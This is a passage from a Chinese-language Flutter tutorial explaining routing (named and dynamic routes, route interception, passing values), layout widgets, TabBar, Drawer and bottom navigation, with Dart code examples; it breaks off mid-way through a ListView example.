&quot;密码&quot;, hintText: &quot;输入密码&quot; ), obscureText: true, validator: (v){ if(v == null || v.length &lt; 5){ return &quot;密码不能小于5位数!&quot;; } }, textInputAction: TextInputAction.send, //将小键盘右下角的回车设置图标 ), SizedBox(height: 16), ElevatedButton( onPressed: (){ //当校验通过时输出 true 否则 false print((_key.currentState as FormState).validate().toString()); }, child: Text(&quot;提交&quot;), ), ]), ); }} # Flutter 路由工具： var res = await Navigator.of (context).push ( // 跳转路由到 MenuPage 并可以接受返回值 这段代码用异步来监听返回值，优点是，无论是否点击按钮返回，都可以接收到返回值 还可以用 .then ((value) =&gt; print (value)); 的方式来获取，这样更简洁，只有返回的时候才会监听，不返回不监听 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758// ignore_for_file: prefer_const_constructors, use_key_in_widget_constructorsimport 'package:flutter/material.dart'; //新页面导包class LoginPage extends StatelessWidget { //无状态widget @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( //标题 title: Text(&quot;登录&quot;), elevation: 10.0, centerTitle: true, ), body: ElevatedButton( //登录按钮 onPressed: () async { var res = await Navigator.of(context).push( //跳转路由到 MenuPage 并可以接受返回值 MaterialPageRoute( builder: (context) { return MenuPage( //传参 menuTitle menuTitle: &quot;菜单&quot;, ); }, settings: RouteSettings( //路由设置 name: &quot;参数&quot;, arguments: &quot;我是参数&quot;, //向目标传参的数据 ), maintainState: false, fullscreenDialog: true, )); print(res); //打印返回值 }, child: Text(&quot;登录&quot;), ), ); }}class MenuPage extends StatelessWidget { final String menuTitle; const MenuPage({Key? key,required this.menuTitle}) : super(key: key); @override Widget build(BuildContext context) { //通过 ModalRoute.of(context)?.settings.arguments; 来获取传参 dynamic arguments = ModalRoute.of(context)?.settings.arguments; return Scaffold( appBar: AppBar( title: Text(menuTitle + &quot; &quot; + arguments), ), body: ElevatedButton( onPressed: (){ Navigator.of(context).pop(&quot;Brath&quot;); }, child: Text(&quot;返回按钮&quot;), ), ); }} Flutter 中管理多个页面时有两个核心概念和类： Route 和 Navigator 。 一个 route 是一个屏幕或页面的抽象， Navigator 是管理 route 的 Widget 。 Navigator 可以通过 route 入栈和出栈来实现页面之间的跳转。 路由一般分为静态路由 (即命名路由) 和动态路由。 # 静态路由 (即命名路由) 静态路由在通过 Navigator 跳转之前，需要在 MaterialApp 组件内显式声明路由的名称，而一旦声明，路由的跳转方式就固定了。通过在 MaterialApp 内的 routes 属性进行显式声明路由的定义。 1234567891011121314151617class MyApp extends StatelessWidget { @override Widget build(BuildContext context) { return MaterialApp( initialRoute: &quot;/&quot;, // 默认加载的界面，这里为RootPage routes: { // 显式声明路由 //&quot;/&quot;:(context) =&gt; RootPage(), &quot;A&quot;:(context) =&gt; Apage(), &quot;B&quot;:(context) =&gt; Bpage(), &quot;C&quot;:(context) =&gt; Cpage(), }, // home: LoginPage(),//当设置命名路由后，home不用设置 ); }}注意：如果指定了home属性，routes表则不能再包含此属性。如上代码中【home: RootPage()】 和 【&quot;/&quot;:(context) =&gt; RootPage()】两则不能同时存在。 例如： RootPage 跳转 Apage 即： RootPage —&gt; Apage 1Navigator.of(context).pushNamed(&quot;A&quot;); 一般方法中带有 Name 多数是通过静态路由完成跳转的，如 pushNamed 、 pushReplacementNamed 、 pushNamedAndRemoveUntil 等。 # 动态路由 动态路由无需在 MaterialApp 内的 routes 中注册即可直接使用：RootPage —&gt; Apage 123Navigator.of(context).push(MaterialPageRoute( builder: (context) =&gt; Apage(),)); 动态路由中，需要传入一个 Route , 这里使用的是 MaterialPageRoute ，它可以使用和平台风格一致的路由切换动画，在 iOS 上左右滑动切换，Android 上会上下滑动切换。也可以使用 CupertinoPageRoute 实现全平台的左右滑动切换。 当然也可以自定义路由切换动画，使用 PageRouteBuilder : 使用 FadeTransition 做一个渐入过渡动画。 123456789101112Navigator.of(context).push( PageRouteBuilder( transitionDuration: Duration(milliseconds: 250), // //动画时间为0.25秒 pageBuilder: (BuildContext context,Animation animation, Animation secondaryAnimation){ return FadeTransition( //渐隐渐入过渡动画 opacity: animation, child: Apage() ); } )); 到现在为止，可能对路由有了一定的认识，，下面就结合具体方法来详细说明。 在这之前有必要说明： Navigator.of(context).push 和 Navigator.push 两着并没有特别的区别，看源码也得知，后者其实就是调用了前者。 of ：获取 Navigator 当前已经实例的状态。 # 路由拦截： flutter 提供了 onGenerateRoute 来使用路由拦截器，作用于强制登录 1234567891011121314151617181920212223242526272829class MyApp extends StatelessWidget { @override Widget build(BuildContext context) { return MaterialApp( debugShowCheckedModeBanner: false, initialRoute: &quot;/&quot;, routes: { &quot;/&quot; :(context) =&gt; LoginPage(), // &quot;menu&quot; :(context) =&gt; MenuPage(), }, onGenerateRoute: (RouteSettings s){ //路由拦截器 print(s.name); //路由名称 if(s.name != &quot;menu&quot;){ //当该路由不等于 menu 强制跳转回首页 return MaterialPageRoute(builder: (context){ return LoginPage(); },settings: s); } switch(s.name){ case &quot;menu&quot; : //当该路由等于 menu 跳转至 menu 菜单 return MaterialPageRoute(builder: (context){ return MenuPage(); },settings: s); break; } }, // home: LoginPage(),//当设置命名路由后，home不用设置 ); }} # 路由方法解释： # pop 返回当前路由栈的上一个界面。 Navigator.pop(context); # push / pushNamed ： 见上，两者运行效果相同，只是调用不同，都是将一个 page 压入路由栈中。直白点就是 push 是把界面直接放入， pushNames 是通过路由名的方式，通过 router 使界面进入对应的栈中。 结果：直接在原来的路由栈上添加一个新的 page 。 # pushReplacement / pushReplacementNamed / popAndPushNamed 替换路由，顾名思义替换当前的路由。 例如 Replacement.png 由图可知在 BPage 使用替换跳转到 Cpage 的时候， Bpage 被 Cpage 替换了在堆栈中的位置而移除栈， CPage 默认返回的是 APage 。 # pushReplacement 使用的动态路由方式跳转： 123Navigator.of(context).pushReplacement(MaterialPageRoute( builder: (context) =&gt; Cpage(),)); # pushReplacementNamed 使用的静态路由方式， 1Navigator.of(context).pushReplacementNamed(&quot;/C&quot;); 两者运行效果相同。 # popAndPushNamed： 1Navigator.of(context).popAndPushNamed(&quot;/C&quot;); 其实和上面两个方法运行的结果也是一致，区别就是动画效果不一样： BPage —&gt; CPage 的时候， CPage 会同时有 pop 的转场效果和从 BPage 页 push 的转场效果。简单来说就是 CPage 先 pop 到 BPage ，在 push 到 CPage 。（不知道是不是卡顿的原因，笔者看起来区别不大） 综上：3 中方法结果一样，只是调用方式和过渡动画的区别，开发者自行选择。 # pushAndRemoveUntil / pushNamedAndRemoveUntil 在使用上述方式跳转时，会按次序移除其他的路由，直到遇到被标记的路由（ predicate 函数返回了 true ）时停止。若 没有标记的路由，则移除全部。 当路由栈中存在重复的标记路由时，默认移除到最近的一个停止。 # 第一种 123// 移除全部Navigator.pushAndRemoveUntil(context, MaterialPageRoute(builder: (_) =&gt; CPage()), (Route router) =&gt; router == null); 或 12// 移除全部Navigator.of(context).pushNamedAndRemoveUntil(&quot;/C&quot;, (Route router) =&gt; router == null); 此时的路由栈示意图： RemoveUntil_all.png 可知出了要 push 的 CPage ，当前路由栈中所有的路由都被移除， CPage 变成根路由。 # 第二种：移除到 RootPage 停止 1234567// &quot;/&quot;即为RootPage，标记后，移除到该路由停止移除Navigator.pushAndRemoveUntil(context, MaterialPageRoute(builder: (_) =&gt; CPage()), ModalRoute.withName('/'))或Navigator.pushAndRemoveUntil(context, MaterialPageRoute(builder: (_) =&gt; CPage()), (Route router) =&gt; router.settings.name == &quot;/&quot;);// 只是写法不一样 或 123Navigator.of(context).pushNamedAndRemoveUntil(&quot;/C&quot;, (Route router) =&gt; router.settings.name == &quot;/&quot;);或Navigator.of(context).pushNamedAndRemoveUntil(&quot;/C&quot;, ModalRoute.withName(&quot;/&quot;)); 此时的路由栈示意图： RemoveUntil_until.png push 到 CPage 的时候，移除到 RootPage 停止， CPage 默认返回 RootPage 。 # popUntil 返回到指定的标记路由，若标记的路由为 null ，则程序退出，慎用！！！ 有时候我们需要根据业务需求判断：可能返回上一级路由，也可能返回上上级路由或是返回指定的路由等。这个时候就不能使用 Replacemen t 和 RemoveUntil 来替换、移除路由了。 例如： until.png 123Navigator.of(context).popUntil((route) =&gt; route.settings.name == &quot;/&quot;);或Navigator.of(context).popUntil(ModalRoute.withName(&quot;/&quot;)); 再例如： 要实现上述功能，从 CPage 返回到 APage ，并且不在 MaterialApp 内的 routes 属性进行显式声明路由。因为笔者觉得一个应用程序的界面太多了，如果每个界面都要显示声明路由，实在是不优雅。 因为需要返回 APage ，还是需要标记路由，所有我们在之前跳转 APage 的时候设置 RouteSettings ，如下： 12345// 设置APage的RouteSettingsNavigator.of(context).push(MaterialPageRoute( settings: RouteSettings(name:&quot;/A&quot;), builder: (context) =&gt; APage(),)); 在 CPage 需要返回的时候，调用就行： 1Navigator.of(context).popUntil(ModalRoute.withName(&quot;/A&quot;)); 这样代码看起来很优雅，不会冗余。 另： 12// 返回根路由Navigator.of(context).popUntil((route) =&gt; route.isFirst); # canPop 用来判断是否可以导航到新页面，返回的 bool 类型，一般是在设备带返回的物理按键时需要判断是否可以 pop 。 # maybePop 可以理解为 canPop 的升级， maybePop 会自动判断。如果当前的路由可以 pop ，则执行当前路由的 pop 操作，否则将不执行。 # removeRoute/removeRouteBelow 删除路由，同时执行 Route.dispose 操作，无过渡动画，正在进行的手势也会被取消。 # removeRoute removeRoute.png BPage 被移除了当前的路由栈。 如果在当前页面调用 removeRoute ，则类似于调用 pop 方法，区别就是无过渡动画，所以 removeRoute 也可以用来返回上一页。 # removeRouteBelow 移除指定路由底层的临近的一个路由，并且对应路由不存在的时候会报错。 同上。 综上：这个两个方法一般情况下很少用，而且必须要持有对应的要移除的路由。 一般用于立即关闭，如移除当前界面的弹出框等。 # 路由传值 常见的路由传值分为两个方面： 向下级路由传值 返回上级路由时传值 要注意的是，我们一般说静态路由不能传值，并不是说一定不能用于传值，而是因为静态路由一般需要在 MaterialApp 内的 routes 属性进行显式声明，在这里使用构造函数传值无实际意义。 如： 12345678910MaterialApp( initialRoute: &quot;/&quot;, // 默认加载的界面，这里为RootPage routes: { // 显式声明路由 &quot;/&quot;:(context) =&gt; RootPage(), &quot;/A&quot;:(context) =&gt; APage(&quot;title&quot;), // 在这里传参无实际意义，一般需要传入的参数都是动态变化的 &quot;/B&quot;:(context) =&gt; BPage(), &quot;/C&quot;:(context) =&gt; CPage(), }, // home: RootPage(), ); # 向下级路由传值 # 1、构造函数传值 首先构造一个可以带参数的构造函数： 123456class APage extends StatefulWidget { String title; APage(this.title); @override _APageState createState() =&gt; _APageState();} 在路由跳转的时候传值： 123Navigator.of(context).push(MaterialPageRoute( builder: (context) =&gt; APage(&quot;这是传入的参数&quot;),)); 在 APage 拿到传入的值： 1234// 在 StatefulWidget 使用[widget.参数名]Container( child: Text(widget.title),) # 2、ModalRoute 传值 在 Navigator.of(context).push 的跳转方式中， MaterialPageRoute 的构造参数中 可以看到有 RouteSettings 的属性， RouteSettings 就是当前路由的基本信息 12345const RouteSettings({ this.name, this.isInitialRoute = false, this.arguments, // 存储路由相关的参数Object }); 路由跳转时设置传递参数： 123456Navigator.of(context).push(MaterialPageRoute( settings: RouteSettings(name:&quot;/A&quot;,arguments: {&quot;argms&quot;:&quot;这是传入A的参数&quot;}), builder: (context) =&gt; APage(),));或使用静态路由pushName：Navigator.of(context).pushNamed(&quot;/A&quot;,arguments:{&quot;argms&quot;:&quot;这是传入A的参数&quot;}); 在 APage 中取值： 12Map argms = ModalRoute.of(context).settings.arguments;print(argms[&quot;argms&quot;]); # 返回上级路由时传值 就是在调用 APage 中调用 pop 返回路由的时候传参 1Navigator.of(context).pop(&quot;这是pop返回的参数值&quot;); 在上一级路由获取： 1234567Navigator.of(context).push(MaterialPageRoute( builder: (context) =&gt; APage(),)).then((value){ // 获取pop的传值 print(value);});或String value = await Navigator.of(context).pushNamed('/xxx'); # Flutter 布局（Layout ）（Widget）： 1234textDirection: TextDirection.ltr, //组件排列方式mainAxisSize: MainAxisSize.max, //主轴最大值mainAxisAlignment: MainAxisAlignment.spaceEvenly, //主轴布局crossAxisAlignment: CrossAxisAlignment.start, //纵轴排列方式 # Column - 纵向 概念：纵轴的宽度，默认使用子组件最大宽度 此时，红色和黄色容器宽度为 100 绿色为 150，整个容器就会使用 最大的子组件宽度 150 来表示自己 Column 代码演示： 123456789101112131415161718192021222324252627282930class LayoutDemo extends StatelessWidget { @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( title: Text(&quot;布局练习&quot;), ), body: Container( color: Colors.grey, child: Column(children: [ Container( width: 100, height: 100, color: Colors.red, ), Container( width: 150, height: 100, color: Colors.green, ), Container( width: 100, height: 100, color: Colors.yellow, ), ]), ) ); }} # Row - 横向 概念：和 Colunm 相似，纵轴的宽度，默认使用子组件最大高度 此时，红色和黄色容器高度为 100 绿色为 200，整个容器就会使用 最大的子组件高度 200 来表示自己 Row 代码演示 1234567891011121314151617181920212223242526272829303132333435class LayoutDemo extends StatelessWidget { @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( title: Text(&quot;布局练习&quot;), ), body: Container( color: Colors.grey, child: Row( textDirection: TextDirection.ltr, //组件排列方式 mainAxisSize: MainAxisSize.max, //主轴最大值 mainAxisAlignment: MainAxisAlignment.spaceEvenly, //主轴布局 crossAxisAlignment: CrossAxisAlignment.start, //纵轴排列方式 children: [ Container( width: 100, height: 200, color: Colors.red, ), Container( width: 150, height: 100, color: Colors.green, ), Container( width: 100, height: 100, color: Colors.yellow, ), ]), ) ); }} # Flutter 弹性布局 (Flex)： flutter 为我们提供了 Flex 这个 widget 来制造弹性布局 Flex 默认 必传方向 Axis children 使用 Expanded 来包裹，可以设置 flex 权重，根据数字大小来设置权重 1234567891011121314151617181920212223242526272829303132333435class LayoutDemo extends StatelessWidget { @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( title: Text(&quot;布局练习&quot;), ), body: Container( color: Colors.grey, child: Flex( direction: Axis.vertical, children: [ Expanded(child: Container( width: 100, height: 200, color: Colors.red, ),flex: 2,), Expanded(child: Container( width: 100, height: 200, color: Colors.green, ),flex: 2,), Expanded(child: Container( width: 100, height: 200, color: Colors.yellow, ),flex: 2,), ], ), )); }} # Flutter 流式布局 (Wrap)： flutter 为我们提供了 Wrap 这个 widget 来制造弹性布局 使用 有状态的 StatefulWidget 来构建 wrap 布局 123456789101112131415161718192021222324252627282930313233343536class WrapDemo extends StatefulWidget { @override State&lt;WrapDemo&gt; createState() =&gt; _WrapDemoState();}class _WrapDemoState extends State&lt;WrapDemo&gt; { var list = &lt;int&gt;[]; @override void initState() { super.initState(); for (var i = 0; i &lt; 20; i++) { //初始化时向数组添加 20 个数据 list.add(i); } } @override Widget build(BuildContext context) { return Wrap( direction: Axis.horizontal, //设置方向 alignment: WrapAlignment.start, //布局参数 spacing: 1.0, //边距 runSpacing: 1.0, //边距 children: list.map((e) =&gt; Container( height: 100, width: 100, child: Text( e.toString(), style: TextStyle( color: Colors.black, fontSize: 20 ) ), color: Colors.blue, )).toList() ); }} # Flutter 层叠布局 (Stack)： flutter 为我们提供了 Stack 这个 widget 来制造层叠布局 我们设置了两个容器 div，在层叠布局中，如果后一个容器，比前面的容器大，那么就会遮挡，原理是为什么？ flutter 在绘画时，从 x 0 y 0 开始绘画，也就是 左上角 意味着两个容器绘画开始的坐标都是相同的，只不过宽高不一样 那么如果第一个容器宽高为 100 第二个为 150 就理所应当的遮住啦！ 123456789101112131415161718192021222324class StackDemo extends StatelessWidget { @override Widget build(BuildContext context) { return Container( color: Colors.grey, width: double.infinity, child: Stack( alignment: AlignmentDirectional.center, //居中布局 children: [ Container( color: Colors.green, width: 150, height: 150, ), Container( color: Colors.red, width: 100, height: 100, ), ], ), ); }} # Flutter 定位布局 (Positioned)： flutter 为我们提供了 Positioned 这个 widget 来制造层叠布局 如果 Positioned 设置了宽高，那么子组件不生效 12345678//如果设置了 ​ top: 10,​ bottom: 10,​ 那么就不能设置高度 height//如果设置了​ left: 10,​ right: 10,​ 那么就不能设置宽度 width 代码演示： 12345678910111213141516171819202122232425262728293031323334353637class StackDemo extends StatelessWidget { @override Widget build(BuildContext context) { return Container( color: Colors.grey, width: double.infinity, child: Stack( alignment: AlignmentDirectional.center, children: [ Container( color: Colors.green, width: 150, height: 150, ), Container( color: Colors.red, width: 100, height: 100, ), Positioned( // width: 100, // height: 100, child: Container( color: Colors.yellow, width: 300, height: 300, ), top: 50, left: 150, right: 150, bottom: 50, ) ], ), ); }} # Flutter 相对定位 (Align)： flutter 为我们提供了 Align 这个 widget 来制造层叠布局 要点：只会相对于父组件来定位，而不是屏幕 12345678910111213141516class AlignDemo extends StatelessWidget { @override Widget build(BuildContext context) { return Container( width: 200, height: 200, color: Colors.green, child: Align( alignment: Alignment.center, //居中 child: FlutterLogo( //flutter的logo size: 60, //宽高60 ), ), ); }} # Flutter 的内外边距 Padding、Margin flutter 为我们提供了 padding 和 margin 这量个 属性来设置内外边距 内边距：当前容器内的组件对于当前容器的距离 外边距：当前容器距离父类容器的距离 代码演示： 12345678910111213141516class PaddingAndMarginDemo extends StatelessWidget { @override Widget build(BuildContext context) { return Container( width: 100, height: 100, color: Colors.red, //设置外边距（当前容器距离父类容器的距离） // margin: EdgeInsets.only(left: 10),//单独设置外边距 margin: EdgeInsets.all(10),//四个方向设置外边距 //设置内边距（当前容器内的组件对于当前容器的距离） padding: EdgeInsets.all(20), child: Text(&quot;我有边距&quot;), ); }} # Flutter 尺寸限制容器（ConstrainedBox）widget： 要点：子 widget 没有设置宽高的时候取自己设置的最大宽高 ConstrainedBox 的特点就是可以设置最大或者最小的宽高，子组件怎么设置都不可以超过这个宽高 代码演示： 123456789101112131415161718class ConstrainedBoxDemo extends StatelessWidget { @override Widget build(BuildContext context) { return ConstrainedBox( constraints: BoxConstraints( maxHeight: 100, maxWidth: 100, minHeight: 50, minWidth: 50, ), child: Container( width: 500, height: 500, color: Colors.red, ), ); }} # Flutter 尺寸限制容器（SizeBox）widget： 要点：如果父容器指定了宽高，那么子组件不可以修改宽高 代码演示： 123456789101112131415class ConstrainedBoxDemo extends StatelessWidget { @override Widget build(BuildContext context) { return SizedBox( // width: 100, // height: 100, child: Container( color: Colors.red, width: 200, height: 200, ), ); }} # Flutter 装饰器（BoxDecoration）widget： flutter 为我们提供了 BoxDecoration 这量个 widget 来设置样式装饰 代码演示： 12345678910111213141516171819202122232425262728293031323334353637383940414243class ConstrainedBoxDemo extends StatelessWidget { @override Widget build(BuildContext context) { return Container( margin: EdgeInsets.all(20), width: double.infinity, child: DecoratedBox( //装饰器 decoration: BoxDecoration( // color: Colors.red gradient: LinearGradient( //渐变颜色 colors: [ Colors.red, //从红色 Colors.green, //到绿色 ], ), borderRadius: BorderRadius.circular(10.0), //圆角度 boxShadow: [ BoxShadow( color: Colors.black, offset: Offset(2.0,2.0), blurRadius: 2, ) ], ), child: Padding( padding: EdgeInsets.only( left: 100, right: 100, top: 20, bottom: 20 ), child: Text( &quot;渐变色~&quot;, style: TextStyle( color: Colors.white ), textAlign: TextAlign.center, ), ), ), ); }} # Flutter 小容器（Container）widget： 要点：当 Container 设置了 foregroundDecoration（前景） 的背景颜色，那么子组件将不会显示 要点：当 Container 设置了 decoration（背景） 的背景颜色，那么子组件将会显示 设置内边距并旋转 0.5 代码演示 123456789101112131415class ContarinerDemo extends StatelessWidget { @override Widget build(BuildContext context) { return Container( margin: EdgeInsets.all(100), //设置内边距 width: 100, height: 100, child: Text(&quot;data&quot;), decoration: BoxDecoration( //设置背景 foregroundDecoration设置前景，会遮挡 color: Colors.red ), transform: Matrix4.rotationZ(0.5), //旋转，可选坐标轴 ); }} # Flutter 小容器（MateriaApp，Scaffold）widget： 1.MateriaApp 是 flutter 的根节点，flutter 规定必须要 MateriaApp 来作为根节点展示 2. 在 MateriaApp 可以设置路由，每个子页面必须由 Scaffold 来包裹 3. 每个 Scaffold 包含两个部分 appBar（头部），body（展示体） # Flutter 的 AppBar： Scaffold 中的 AppBar 有很多特性： 代码演示 12345678910111213141516171819202122232425262728293031323334353637383940414243class PageDemo extends StatefulWidget { @override State&lt;PageDemo&gt; createState() =&gt; _PageDemoState();}class _PageDemoState extends State&lt;PageDemo&gt; { @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( leading: IconButton( //设置左侧图标 onPressed: () { print(&quot;点击了！&quot;); }, icon: Icon(Icons.home) //左边房子图片 ), // centerTitle: true, //设置centerTitle为true，可将标题居中 title: Text( &quot;演示&quot;, style: TextStyle(fontSize: 15), ), actions: [ //设置左侧图标 IconButton( onPressed: () { print(&quot;点击了加！&quot;); }, icon: Icon(Icons.add)), IconButton( onPressed: () { print(&quot;点击了减！&quot;); }, icon: Icon(Icons.remove)), IconButton( onPressed: () { print(&quot;点击了灯！&quot;); }, icon: Icon(Icons.wb_iridescent_rounded)), ], elevation: 10.0, ), // body: , ); }} # Flutter 的顶部 TabBar 选项卡： Flutter 提供 顶部 TabBar 选项卡 代码演示： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354class PageDemo extends StatefulWidget { @override State&lt;PageDemo&gt; createState() =&gt; _PageDemoState();}class _PageDemoState extends State&lt;PageDemo&gt; with SingleTickerProviderStateMixin{ List tabs = [&quot;Fullter&quot;, &quot;Andiord&quot;, &quot;IOS&quot;]; //选项卡数组 //选项控制器 late TabController _controller = TabController(length: tabs.length, vsync: this); //选项索引 int _index = 0; /** * 初始化 **/ @override void initState() { _controller = TabController( //创建新控制器 initialIndex: _index, //设置初始索引 length: tabs.length, //长度为数组疮毒 vsync: this ); _controller.addListener(() { //监听器 setState(() { //监听状态，当状态改变，把控制器索引赋值到选项索引，用来做内容切换 _index = _controller.index; }); }); super.initState(); } /** * 销毁 **/ @override void dispose() { _controller.dispose(); super.dispose(); } @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( elevation: 10.0, //阴影 bottom: TabBar( controller: _controller, //选项接收控制器 tabs: tabs.map((e) =&gt; Tab( //遍历选项 text: e, //文本为map中的内容 )).toList(), //转为集合 ), ), body: Text(_index.toString()), //body可以根据index来输出不同内容 ); }} # Flutter 的顶部 TabBar 选项卡（进阶） 使用 Flutter 提供 顶部 TabBarView 组件来设置选项卡 代码演示： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475class PageDemo extends StatefulWidget { //指定三个容器页面，在下方调用 widget.widgets 因为泛型指定了 Widget 所以都是Widget数组 List&lt;Widget&gt; widgets = [FlutterView(),AndroidView(),IOSView()]; @override State&lt;PageDemo&gt; createState() =&gt; _PageDemoState();}class _PageDemoState extends State&lt;PageDemo&gt; with SingleTickerProviderStateMixin{ List tabs = [&quot;Fullter&quot;, &quot;Andiord&quot;, &quot;IOS&quot;]; late TabController _controller = TabController(length: tabs.length, vsync: this); @override void initState() { _controller = TabController( length: tabs.length, vsync: this ); super.initState(); } @override void dispose() { _controller.dispose(); super.dispose(); } @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( elevation: 10.0, bottom: TabBar( controller: _controller, tabs: tabs.map((e) =&gt; Tab( text: e, )).toList(), ), ), body: TabBarView( //使用 TabBarView 包裹body children: widget.widgets, //内容就是widgets controller: _controller, //通过控制器来切换 ) ); }}class FlutterView extends StatelessWidget { @override Widget build(BuildContext context) { return Center( child: Text(&quot;FlutterView&quot;), ); }}class AndroidView extends StatelessWidget { @override Widget build(BuildContext context) { return Center( child: Text(&quot;AndroidView&quot;), ); }}class IOSView extends StatelessWidget { @override Widget build(BuildContext context) { return Center( child: Text(&quot;IOSView&quot;), ); }} # Flutter 的侧抽屉 Drawer 样式 使用 Flutter 提供 侧抽屉 Drawer 组件来设置抽屉样式 # 要点：drawer 是 Scaffold 中的属性，并不是 AppBar 的 代码演示： 12345678910111213141516171819class myDrawer extends StatelessWidget { @override Widget build(BuildContext context) { return Drawer( child: MediaQuery.removePadding( //删除边距 context: context, child: Column( crossAxisAlignment: CrossAxisAlignment.start, //从左开始 children: [ Padding(padding: EdgeInsets.only(top: 40), child: Text(&quot;Brath&quot;), ) ], ), removeTop: true, //删除顶部 ), ); }} # Flutter 的底部选项卡 使用 flutter 提供的 bottomNavigationBar 来做底部选项卡，做到点击卡片切换页面 代码演示： 12345678910111213141516171819202122232425262728293031323334353637383940414243class BottomNavigatorBarDemo extends StatefulWidget { const BottomNavigatorBarDemo({ Key? key }) : super(key: key); @override State&lt;BottomNavigatorBarDemo&gt; createState() =&gt; _BottomNavigatorBarDemoState();}class _BottomNavigatorBarDemoState extends State&lt;BottomNavigatorBarDemo&gt; { int _index = 0; //页面index @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( title: Text(&quot;底部选项卡&quot;), ), bottomNavigationBar: BottomNavigationBar( //底部选项widget items: [ //三个选项 BottomNavigationBarItem( icon: Icon(Icons.add), label: &quot;新增&quot; ), BottomNavigationBarItem( icon: Icon(Icons.home), label: &quot;我的&quot; ), BottomNavigationBarItem( icon: Icon(Icons.remove), label: &quot;减少&quot; ), ], currentIndex: _index, //当前index onTap: (v){ //当点击时，把当前索引状态改为点击的索引 setState(() { _index = v; }); }, ), body: Center(child: Text(_index.toString())), //展示当前索引 ); }} # Flutter 的底部选项卡（进阶版） 使用 flutter 提供的 bottomNavigationBar 来做底部选项卡，做到按钮居中布局 要点：两种实现方式，BottomNavigationBar 中如果 BottomNavigationBarItem 超过三个需要设置 type👇否则不显示 1type: BottomNavigationBarType.fixed 代码演示： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657class BottomNavigatorBarDemo extends StatefulWidget { List&lt;Widget&gt; widgets = [ //四个页面数组 PageDemo(), LayoutDemo(), LoginPage(), LoginPage(), ]; @override State&lt;BottomNavigatorBarDemo&gt; createState() =&gt; _BottomNavigatorBarDemoState();}class _BottomNavigatorBarDemoState extends State&lt;BottomNavigatorBarDemo&gt; { int _index = 0; //页面index @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( title: Text(&quot;底部选项卡&quot;), ), bottomNavigationBar: BottomNavigationBar( //底部选项widget type: BottomNavigationBarType.fixed, //设置超出三个页面显示 items: [ //三个选项 BottomNavigationBarItem( icon: Icon(Icons.add), label: &quot;首页&quot; ), BottomNavigationBarItem( icon: Icon(Icons.home), label: &quot;我的&quot; ), BottomNavigationBarItem( icon: Icon(Icons.remove), label: &quot;登录&quot; ), BottomNavigationBarItem( icon: Icon(Icons.remove), label: &quot;登录&quot; ), ], currentIndex: _index, //当前index onTap: (v){ //当点击时，把当前索引状态改为点击的索引 setState(() { _index = v; }); }, ), floatingActionButtonLocation: FloatingActionButtonLocation.centerDocked, //将按钮作为居中嵌入下方tabbar floatingActionButton: FloatingActionButton( //设置居中按钮 onPressed: (){ print(&quot;object&quot;); }, ), body: widget.widgets[_index], //展示当前索引 ); }} 第二种实现方式： 代码演示： 1234567891011121314151617181920212223242526272829303132333435363738class _BottomNavigatorBarDemoState extends State&lt;BottomNavigatorBarDemo&gt; { int _index = 0; //页面index @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( title: Text(&quot;底部选项卡&quot;), ), bottomNavigationBar: BottomAppBar( color: Theme.of(context).primaryColorDark, //设置tabbar颜色主题 shape: CircularNotchedRectangle(), //设置按钮风格 child: Row( mainAxisAlignment: MainAxisAlignment.spaceAround, children: [ IconButton( onPressed: (){ }, icon: Icon(Icons.add)), SizedBox(height: 16), IconButton( onPressed: (){ }, icon: Icon(Icons.home)), ] ), ), floatingActionButtonLocation: FloatingActionButtonLocation.centerDocked, floatingActionButton: FloatingActionButton( onPressed: (){ print(&quot;object&quot;); }, ), body: widget.widgets[_index], //展示当前索引 ); }} # Flutter 的列表 （ListView）Widget flutter 为我们提供了 ListView 这个 widget 来展示我们的列表 源码展示： 1234567891011121314151617181920212223//均为可选参数ListView({ Key? key, Axis scrollDirection = Axis.vertical, //滑动方向，默认垂直 bool reverse = false, //是否反向，默认否 ScrollController? controller, //监听滑动距离回调 控制器 bool? primary, ScrollPhysics? physics, bool shrinkWrap = false, //限制listview的高度为子组件的高度 EdgeInsetsGeometry? padding, this.itemExtent, //设置list展示间距 this.prototypeItem, bool addAutomaticKeepAlives = true, bool addRepaintBoundaries = true, bool addSemanticIndexes = true, double? cacheExtent, List&lt;Widget&gt; children = const &lt;Widget&gt;[], int? semanticChildCount, DragStartBehavior dragStartBehavior = DragStartBehavior.start, ScrollViewKeyboardDismissBehavior keyboardDismissBehavior = ScrollViewKeyboardDismissBehavior.manual, String? restorationId, Clip clipBehavior = Clip.hardEdge, }) # 用 ListView 实现滑动列表，并且可以细粒度显示每个 list 数据，并且可以点击按钮返回顶部 代码展示： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687class ListViewDemo extends StatefulWidget { //创建无状态Widget @override State&lt;ListViewDemo&gt; createState() =&gt; _ListViewDemoState();}class _ListViewDemoState extends State&lt;ListViewDemo&gt; { List&lt;int&gt; list = []; //初始化list为空 ScrollController _controller = ScrollController(); //控制器 bool show = false; //是否展示按钮 @override void initState() { super.initState(); _controller = ScrollController(); //初始化时，初始控制器 _controller.addListener(() { //增加控制器监听 if(_controller.offset &gt;= 100 &amp;&amp; show == false){ //如果滑动距离大于100并且按钮没展示那就展示按钮 setState(() { show = true; }); }else if(_controller.offset &lt; 100 &amp;&amp; show == true){ //如果滑动距离小于100并且按钮展示那就关闭按钮 setState(() { show = false; }); } }); for (var i = 0; i &lt; 100; i++) { list.add(i); //循环添加到数组 } } @override void dispose() { // TODO: implement dispose super.dispose(); _controller.dispose(); //退出时，销毁控制器，否则内存会溢出 } @override Widget build(BuildContext context) { return Scaffold( appBar: AppBar( title: Text(&quot;滚动列表&quot;), ), floatingActionButton: show ? FloatingActionButton( //使用三元来控制按钮展示 